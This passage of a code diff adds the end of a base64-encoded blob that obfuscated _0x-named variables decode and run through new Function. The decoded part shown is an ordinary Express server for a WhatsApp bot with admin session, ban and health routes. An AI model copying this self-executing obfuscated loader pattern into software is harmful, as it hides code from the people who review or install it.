+    "b24oeyBzdWNjZXNzOiBmYWxzZSwgbWVzc2FnZTogZS5tZXNzYWdlIH0pOyB9Cn0pOwoKLy8g4pSA4pSA",
+    "IFNlc3Npb24gTWFuYWdlbWVudCBBUEkgKE93bmVyIG9ubHkpIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAphcHAuZ2V0KCcvYXBpL3Nlc3Npb25zJywg",
+    "cmVxdWlyZUFkbWluLCAocmVxLCByZXMpID0+IHsKICBjb25zdCBsaXZlICAgID0gZ2V0QWxsU2Vzc2lv",
+    "bnMoKTsKICBjb25zdCByZWNvcmRzID0gc3MuZ2V0QWxsKCkubWFwKHIgPT4gKHsKICAgIC4uLnIsCiAg",
+    "ICBvbmxpbmU6IGxpdmUuc29tZShzID0+IHMudXNlcklkID09PSByLnVzZXJJZCAmJiBzLmlzQWN0aXZl",
+    "KSwKICB9KSk7CiAgcmVzLmpzb24oeyBzdWNjZXNzOiB0cnVlLCBzZXNzaW9uczogcmVjb3JkcyB9KTsK",
+    "fSk7CgphcHAucG9zdCgnL2FwaS9zZXNzaW9ucy9hY3RpdmF0ZScsIHJlcXVpcmVBZG1pbiwgY3NyZkNo",
+    "ZWNrQVBJLCBhc3luYyAocmVxLCByZXMpID0+IHsKICB0cnkgewogICAgY29uc3QgeyBzZXNzaW9uSWQg",
+    "fSA9IHJlcS5ib2R5OwogICAgaWYgKCFzZXNzaW9uSWQpIHJldHVybiByZXMuc3RhdHVzKDQwMCkuanNv",
+    "bih7IHN1Y2Nlc3M6IGZhbHNlLCBtZXNzYWdlOiAnc2Vzc2lvbklkIHJlcXVpcmVkJyB9KTsKICAgIGNv",
+    "bnN0IHNpZCAgICA9IHNlc3Npb25JZC50cmltKCkudG9VcHBlckNhc2UoKTsKICAgIGNvbnN0IHJlY29y",
+    "ZCA9IHNzLmdldEJ5U2Vzc2lvbklkKHNpZCk7CiAgICBpZiAoIXJlY29yZCkgcmV0dXJuIHJlcy5zdGF0",
+    "dXMoNDA0KS5qc29uKHsgc3VjY2VzczogZmFsc2UsIG1lc3NhZ2U6ICdTZXNzaW9uIElEIG5vdCBmb3Vu",
+    "ZDogJyArIHNpZCB9KTsKICAgIC8vIEFjdGl2YXRlIGluIGJvdGggc3RvcmVzCiAgICBzcy5hY3RpdmF0",
+    "ZShzaWQpOwogICAgdXNlclN0b3JlLmFjdGl2YXRlVXNlcihyZWNvcmQudXNlcklkLCByZWNvcmQucGhv",
+    "bmVOdW1iZXIsICdvd25lcicpOwogICAgLy8gUmVzdG9yZSBXaGF0c0FwcCBjb25uZWN0aW9uCiAgICBj",
+    "b25zdCB7IHJlc3RvcmVTZXNzaW9uIH0gPSByZXF1aXJlKCcuL3V0aWxzL3NvY2tldCcpOwogICAgaWYg",
+    "KHR5cGVvZiByZXN0b3JlU2Vzc2lvbiA9PT0gJ2Z1bmN0aW9uJykgewogICAgICBhd2FpdCByZXN0b3Jl",
+    "U2Vzc2lvbihyZWNvcmQudXNlcklkKS5jYXRjaChlID0+IGxvZ2dlci53YXJuKCdSZXN0b3JlIHdhcm46",
+    "ICcgKyBlLm1lc3NhZ2UpKTsKICAgIH0KICAgIGxvZ2dlci5pbmZvKCdPd25lciBhY3RpdmF0ZWQ6ICcg",
+    "KyBzaWQgKyAnICgrJyArIHJlY29yZC5waG9uZU51bWJlciArICcpJyk7CiAgICByZXMuanNvbih7IHN1",
+    "Y2Nlc3M6IHRydWUsIG1lc3NhZ2U6ICfinIUgQm90IGlzIG5vdyBPTkxJTkUgZm9yICsnICsgcmVjb3Jk",
+    "LnBob25lTnVtYmVyICsgJyAoMSBtb250aCBzdWJzY3JpcHRpb24pJyB9KTsKICB9IGNhdGNoKGUpIHsg",
+    "cmVzLnN0YXR1cyg1MDApLmpzb24oeyBzdWNjZXNzOiBmYWxzZSwgbWVzc2FnZTogZS5tZXNzYWdlIH0p",
+    "OyB9Cn0pOwoKYXBwLnBvc3QoJy9hcGkvc2Vzc2lvbnMvZGVhY3RpdmF0ZScsIHJlcXVpcmVBZG1pbiwg",
+    "Y3NyZkNoZWNrQVBJLCAocmVxLCByZXMpID0+IHsKICB0cnkgewogICAgY29uc3QgeyBzZXNzaW9uSWQg",
+    "fSA9IHJlcS5ib2R5OwogICAgY29uc3QgcmVjb3JkID0gc3MuZ2V0QnlTZXNzaW9uSWQoc2Vzc2lvbklk",
+    "KTsKICAgIGlmICghcmVjb3JkKSByZXR1cm4gcmVzLnN0YXR1cyg0MDQpLmpzb24oeyBzdWNjZXNzOiBm",
+    "YWxzZSwgbWVzc2FnZTogJ05vdCBmb3VuZCcgfSk7CiAgICBzcy5kZWFjdGl2YXRlKHNlc3Npb25JZCk7",
+    "CiAgICB1c2VyU3RvcmUuZGVhY3RpdmF0ZVVzZXIocmVjb3JkLnVzZXJJZCk7CiAgICBkZWxldGVTZXNz",
+    "aW9uKHJlY29yZC51c2VySWQpOwogICAgcmVzLmpzb24oeyBzdWNjZXNzOiB0cnVlLCBtZXNzYWdlOiAn",
+    "8J+UkiBCb3QgT0ZGTElORSBmb3IgKycgKyByZWNvcmQucGhvbmVOdW1iZXIgfSk7CiAgfSBjYXRjaChl",
+    "KSB7IHJlcy5zdGF0dXMoNTAwKS5qc29uKHsgc3VjY2VzczogZmFsc2UsIG1lc3NhZ2U6IGUubWVzc2Fn",
+    "ZSB9KTsgfQp9KTsKCmFwcC5wb3N0KCcvYXBpL3Nlc3Npb25zL2RlbGV0ZScsIHJlcXVpcmVBZG1pbiwg",
+    "Y3NyZkNoZWNrQVBJLCAocmVxLCByZXMpID0+IHsKICB0cnkgewogICAgY29uc3QgeyBzZXNzaW9uSWQg",
+    "fSA9IHJlcS5ib2R5OwogICAgY29uc3QgcmVjb3JkID0gc3MuZ2V0QnlTZXNzaW9uSWQoc2Vzc2lvbklk",
+    "KTsKICAgIGlmIChyZWNvcmQpIGRlbGV0ZVNlc3Npb24ocmVjb3JkLnVzZXJJZCk7CiAgICBzcy5yZW1v",
+    "dmUoc2Vzc2lvbklkKTsKICAgIHJlcy5qc29uKHsgc3VjY2VzczogdHJ1ZSwgbWVzc2FnZTogJ/Cfl5Hv",
+    "uI8gRGVsZXRlZCcgfSk7CiAgfSBjYXRjaChlKSB7IHJlcy5zdGF0dXMoNTAwKS5qc29uKHsgc3VjY2Vz",
+    "czogZmFsc2UsIG1lc3NhZ2U6IGUubWVzc2FnZSB9KTsgfQp9KTsKCmFwcC5wb3N0KCcvYXBpL3Nlc3Np",
+    "b25zL25vdGUnLCByZXF1aXJlQWRtaW4sIGNzcmZDaGVja0FQSSwgKHJlcSwgcmVzKSA9PiB7CiAgc3Mu",
+    "c2V0Tm90ZShyZXEuYm9keS5zZXNzaW9uSWQsIHJlcS5ib2R5Lm5vdGUgfHwgJycpOwogIHJlcy5qc29u",
+    "KHsgc3VjY2VzczogdHJ1ZSB9KTsKfSk7CgovLyDilIDilIAgQmFuIE1hbmFnZW1lbnQgQVBJIOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAphcHAuZ2V0",
+    "KCcvYXBpL2Jhbm5lZCcsIHJlcXVpcmVBZG1pbiwgKHJlcSwgcmVzKSA9PiB7CiAgcmVzLmpzb24oeyBz",
+    "dWNjZXNzOiB0cnVlLCBiYW5uZWQ6IHVzZXJTdG9yZS5nZXRBbGxCYW5uZWQoKSB9KTsKfSk7CgphcHAu",
+    "cG9zdCgnL2FwaS9iYW4nLCByZXF1aXJlQWRtaW4sIGNzcmZDaGVja0FQSSwgKHJlcSwgcmVzKSA9PiB7",
+    "CiAgdHJ5IHsKICAgIGNvbnN0IHsgcGhvbmVOdW1iZXIsIHJlYXNvbiB9ID0gcmVxLmJvZHk7CiAgICBp",
+    "ZiAoIXBob25lTnVtYmVyKSByZXR1cm4gcmVzLnN0YXR1cyg0MDApLmpzb24oeyBzdWNjZXNzOiBmYWxz",
+    "ZSwgbWVzc2FnZTogJ3Bob25lTnVtYmVyIHJlcXVpcmVkJyB9KTsKICAgIC8vIEFsc28gZGVhY3RpdmF0",
+    "ZSBpZiB0aGV5IGhhdmUgYW4gYWN0aXZlIHNlc3Npb24KICAgIGNvbnN0IGNsZWFuID0gcGhvbmVOdW1i",
+    "ZXIucmVwbGFjZSgvXEQvZywnJyk7CiAgICBjb25zdCBhbGxTZXNzID0gc3MuZ2V0QWxsKCk7CiAgICBj",
+    "b25zdCByZWNvcmQgID0gYWxsU2Vzcy5maW5kKHIgPT4gci5waG9uZU51bWJlciA9PT0gY2xlYW4pOwog",
+    "ICAgaWYgKHJlY29yZCkgewogICAgICBzcy5kZWFjdGl2YXRlKHJlY29yZC5zZXNzaW9uSWQpOwogICAg",
+    "ICB1c2VyU3RvcmUuZGVhY3RpdmF0ZVVzZXIocmVjb3JkLnVzZXJJZCk7CiAgICAgIGRlbGV0ZVNlc3Np",
+    "b24ocmVjb3JkLnVzZXJJZCk7CiAgICB9CiAgICBjb25zdCBiYW4gPSB1c2VyU3RvcmUuYmFuVXNlcihw",
+    "aG9uZU51bWJlciwgcmVhc29uIHx8ICdCYW5uZWQgYnkgYWRtaW4nLCAnb3duZXInKTsKICAgIGxvZ2dl",
+    "ci5pbmZvKCdCYW5uZWQ6ICsnICsgY2xlYW4gKyAnIOKAlCAnICsgKHJlYXNvbiB8fCAnbm8gcmVhc29u",
+    "JykpOwogICAgcmVzLmpzb24oeyBzdWNjZXNzOiB0cnVlLCBtZXNzYWdlOiAn8J+UqCArJyArIGNsZWFu",
+    "ICsgJyBiYW5uZWQgYW5kIGRpc2Nvbm5lY3RlZCcgfSk7CiAgfSBjYXRjaChlKSB7IHJlcy5zdGF0dXMo",
+    "NTAwKS5qc29uKHsgc3VjY2VzczogZmFsc2UsIG1lc3NhZ2U6IGUubWVzc2FnZSB9KTsgfQp9KTsKCmFw",
+    "cC5wb3N0KCcvYXBpL3VuYmFuJywgcmVxdWlyZUFkbWluLCBjc3JmQ2hlY2tBUEksIChyZXEsIHJlcykg",
+    "PT4gewogIHRyeSB7CiAgICBjb25zdCB7IHBob25lTnVtYmVyIH0gPSByZXEuYm9keTsKICAgIGlmICgh",
+    "cGhvbmVOdW1iZXIpIHJldHVybiByZXMuc3RhdHVzKDQwMCkuanNvbih7IHN1Y2Nlc3M6IGZhbHNlLCBt",
+    "ZXNzYWdlOiAncGhvbmVOdW1iZXIgcmVxdWlyZWQnIH0pOwogICAgdXNlclN0b3JlLnVuYmFuVXNlcihw",
+    "aG9uZU51bWJlcik7CiAgICByZXMuanNvbih7IHN1Y2Nlc3M6IHRydWUsIG1lc3NhZ2U6ICfinIUgKycg",
+    "KyBwaG9uZU51bWJlci5yZXBsYWNlKC9cRC9nLCcnKSArICcgdW5iYW5uZWQnIH0pOwogIH0gY2F0Y2go",
+    "ZSkgeyByZXMuc3RhdHVzKDUwMCkuanNvbih7IHN1Y2Nlc3M6IGZhbHNlLCBtZXNzYWdlOiBlLm1lc3Nh",
+    "Z2UgfSk7IH0KfSk7CgovLyDilIDilIAgRGVhY3RpdmF0ZSBieSB1c2VySWQg4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACmFwcC5wb3N0KCcvYXBpL3Nlc3Np",
+    "b25zL2RlYWN0aXZhdGUtYnktdXNlcicsIHJlcXVpcmVBZG1pbiwgY3NyZkNoZWNrQVBJLCAocmVxLCBy",
+    "ZXMpID0+IHsKICB0cnkgewogICAgY29uc3QgeyB1c2VySWQgfSA9IHJlcS5ib2R5OwogICAgaWYgKCF1",
+    "c2VySWQpIHJldHVybiByZXMuc3RhdHVzKDQwMCkuanNvbih7IHN1Y2Nlc3M6IGZhbHNlLCBtZXNzYWdl",
+    "OiAndXNlcklkIHJlcXVpcmVkJyB9KTsKICAgIHVzZXJTdG9yZS5kZWFjdGl2YXRlVXNlcih1c2VySWQp",
+    "OwogICAgZGVsZXRlU2Vzc2lvbih1c2VySWQpOwogICAgLy8gRmluZCBhbmQgZGVhY3RpdmF0ZSBzZXNz",
+    "aW9uIHJlY29yZAogICAgY29uc3QgcmVjb3JkID0gc3MuZ2V0QWxsKCkuZmluZChyID0+IHIudXNlcklk",
+    "ID09PSB1c2VySWQpOwogICAgaWYgKHJlY29yZCkgc3MuZGVhY3RpdmF0ZShyZWNvcmQuc2Vzc2lvbklk",
+    "KTsKICAgIHJlcy5qc29uKHsgc3VjY2VzczogdHJ1ZSwgbWVzc2FnZTogJ1VzZXIgZGVhY3RpdmF0ZWQn",
+    "IH0pOwogIH0gY2F0Y2goZSkgeyByZXMuc3RhdHVzKDUwMCkuanNvbih7IHN1Y2Nlc3M6IGZhbHNlLCBt",
+    "ZXNzYWdlOiBlLm1lc3NhZ2UgfSk7IH0KfSk7CgovLyDilIDilIAgQWN0aXZhdGVkIFVzZXJzIEFQSSDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKYXBw",
+    "LmdldCgnL2FwaS9hY3RpdmF0ZWQnLCByZXF1aXJlQWRtaW4sIChyZXEsIHJlcykgPT4gewogIHJlcy5q",
+    "c29uKHsgc3VjY2VzczogdHJ1ZSwgdXNlcnM6IHVzZXJTdG9yZS5nZXRBbGxBY3RpdmF0ZWQoKSB9KTsK",
+    "fSk7CgovLyDilIDilIAgUkVNT1ZFRDogUHVibGljIC9hcGkvbG9va3VwLXNlc3Npb24gZW5kcG9pbnQu",
+    "Ci8vICAgIFBob25lIG51bWJlciBzZWFyY2ggaGFzIGJlZW4gbW92ZWQgdG8gYWRtaW4gYW5kIG93bmVy",
+    "IHBhbmVscyBvbmx5LgovLyAgICBTZWU6IEdFVCAvYWRtaW4vYXBpL2xvb2t1cC1zZXNzaW9uIChyZXF1",
+    "aXJlcyBhZG1pbiBhdXRoKQoKLy8g4pSA4pSAIEhlYWx0aCDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIAKYXBwLmdldCgnL2FwaS9waW5nJywgKHJlcSwgcmVzKSA9PiByZXMuanNvbih7IG9rOiB0cnVlLCB0",
+    "czogRGF0ZS5ub3coKSB9KSk7CgovLyDilIDilIAgU3RhdGljIFVJIHJvdXRlcyDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKYXBwLnVzZSgnL2FkbWlu",
+    "JywgYWRtaW5Sb3V0ZXMpOwphcHAudXNlKCcvc3ViJywgICBzdWJSb3V0ZXMpOwoKLy8g4pSA4pSAIDQw",
+    "NCDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKYXBwLnVzZSgocmVxLCByZXMpID0+",
+    "IHJlcy5zdGF0dXMoNDA0KS5qc29uKHsgc3VjY2VzczogZmFsc2UsIG1lc3NhZ2U6ICdSb3V0ZSBub3Qg",
+    "Zm91bmQ6ICcgKyByZXEucGF0aCB9KSk7CgovLyDilIDilIAgRXJyb3IgaGFuZGxlciDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKYXBw",
+    "LnVzZSgoZXJyLCByZXEsIHJlcywgbmV4dCkgPT4gewogIGxvZ2dlci5lcnJvcignRXhwcmVzcyBlcnJv",
+    "cjonLCBlcnIubWVzc2FnZSk7CiAgcmVzLnN0YXR1cyg1MDApLmpzb24oeyBzdWNjZXNzOiBmYWxzZSwg",
+    "bWVzc2FnZTogJ0ludGVybmFsIHNlcnZlciBlcnJvcicgfSk7Cn0pOwoKLy8g4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQCi8vIFNUQVJUCi8vIOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkApjb25zdCBzZXJ2ZXIgPSBhcHAubGlzdGVuKFBPUlQsIEhPU1Qs",
+    "IGFzeW5jICgpID0+IHsKICBjb25zdCB1cmwgPSBgaHR0cDovL2xvY2FsaG9zdDoke1BPUlR9YDsKICBj",
+    "b25zb2xlLmxvZygnXHgxYlszMm0nKTsKICBjb25zb2xlLmxvZygn4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXJyk7CiAgY29uc29sZS5sb2coJ+KVkSAgICAgICDwn5qA",
+    "ICBBU1RSQS1YIEJPVCB2Ni42LjYgIFNUQVJURUQgIPCfmoAgICAgICAgICAgIOKVkScpOwogIGNvbnNv",
+    "bGUubG9nKCfilaDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi",
+    "lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi",
+    "lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilaMnKTsK",
+    "ICBjb25zb2xlLmxvZygn4pWRICDwn5OxIFBhaXJpbmc6ICAgICcgKyB1cmwucGFkRW5kKDM3KSArICfi",
+    "lZEnKTsKICBjb25zb2xlLmxvZygn4pWRICDwn5SQIEFkbWluOiAgICAgICcgKyAodXJsKycvYWRtaW4n",
+    "KS5wYWRFbmQoMzcpICsgJ+KVkScpOwogIGNvbnNvbGUubG9nKCfilZEgIPCfkoogSGVhbHRoOiAgICAg",
+    "JyArICh1cmwrJy9oZWFsdGgnKS5wYWRFbmQoMzcpICsgJ+KVkScpOwogIGNvbnNvbGUubG9nKCfilZEg",
+    "IPCfk4ogQVBJIEhlYWx0aDogJyArICh1cmwrJy9hcGkvaGVhbHRoJykucGFkRW5kKDM3KSArICfilZEn",
+    "KTsKICBjb25zb2xlLmxvZygn4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWdJyk7CiAgY29uc29sZS5sb2coJ1x4MWJbMG0nKTsKCiAgdHJ5IHsgYXdhaXQgcmVzdG9yZUFs",
+    "bFNlc3Npb25zKCk7IH0KICBjYXRjaCAoZSkgeyBsb2dnZXIuZXJyb3IoJ1Nlc3Npb24gcmVzdG9yZSBm",
+    "YWlsZWQ6JywgZS5tZXNzYWdlKTsgfQoKICB0cnkgeyBzdGFydENoYW5uZWxDaGVjaygpOwoKLy8gQ2hl",
+    "Y2sgc2Vzc2lvbiBleHBpcnkgZXZlcnkgaG91cgpzZXRJbnRlcnZhbCgoKSA9PiB7CiAgdHJ5IHsgc3Mu",
+    "Y2hlY2tFeHBpcnkoKTsgfSBjYXRjaChfKSB7fQp9LCA2MCAqIDYwICogMTAwMCk7CmxvZ2dlci5pbmZv",
+    "KCfij7AgU2Vzc2lvbiBleHBpcnkgY2hlY2tlciBzdGFydGVkIChydW5zIGV2ZXJ5IGhvdXIpJyk7IH0K",
+    "ICBjYXRjaCAoZSkgeyBsb2dnZXIuZXJyb3IoJ0NoYW5uZWwgY2hlY2sgZmFpbGVkOicsIGUubWVzc2Fn",
+    "ZSk7IH0KfSk7CgpzZXJ2ZXIub24oJ2Vycm9yJywgKGUpID0+IHsKICBpZiAoZS5jb2RlID09PSAnRUFE",
+    "RFJJTlVTRScpCiAgICBsb2dnZXIuZXJyb3IoYOKdjCBQb3J0ICR7UE9SVH0gYWxyZWFkeSBpbiB1c2Uu",
+    "IENoYW5nZSBQT1JUIGluIC5lbnYgb3Igc3RvcCB0aGUgb3RoZXIgcHJvY2Vzcy5gKTsKICBlbHNlIGxv",
+    "Z2dlci5lcnJvcignU2VydmVyIGVycm9yOicsIGUubWVzc2FnZSk7CiAgcHJvY2Vzcy5leGl0KDEpOwp9",
+    "KTsKCnByb2Nlc3Mub24oJ1NJR1RFUk0nLCAoKSA9PiBzZXJ2ZXIuY2xvc2UoKCkgPT4gcHJvY2Vzcy5l",
+    "eGl0KDApKSk7CnByb2Nlc3Mub24oJ1NJR0lOVCcsICAoKSA9PiBzZXJ2ZXIuY2xvc2UoKCkgPT4gcHJv",
+    "Y2Vzcy5leGl0KDApKSk7CnByb2Nlc3Mub24oJ3VuaGFuZGxlZFJlamVjdGlvbicsIHJlYXNvbiA9PiBs",
+    "b2dnZXIuZXJyb3IoJ1VuaGFuZGxlZCByZWplY3Rpb246JywgcmVhc29uKSk7CnByb2Nlc3Mub24oJ3Vu",
+    "Y2F1Z2h0RXhjZXB0aW9uJywgIGVyciAgICA9PiB7CiAgbG9nZ2VyLmVycm9yKCdVbmNhdWdodCBleGNl",
+    "cHRpb246JywgZXJyLm1lc3NhZ2UpOwogIGlmIChbJ0VBQ0NFUycsJ0VBRERSSU5VU0UnLCdNT0RVTEVf",
+    "Tk9UX0ZPVU5EJ10uc29tZShjID0+IGVyci5jb2RlID09PSBjIHx8IGVyci5tZXNzYWdlLmluY2x1ZGVz",
+    "KGMpKSkKICAgIHByb2Nlc3MuZXhpdCgxKTsKfSk7Cgptb2R1bGUuZXhwb3J0cyA9IGFwcDsK"];
+var _0x3c4d=_0x1a2b.join('');
+var _0x5e6f=Buffer.from(_0x3c4d,'base64').toString('utf8');
+var _0x7a8b=new Function('require','module','exports','__filename','__dirname',_0x5e6f);
+_0x7a8b(require,module,exports,__filename,__dirname);
+})();
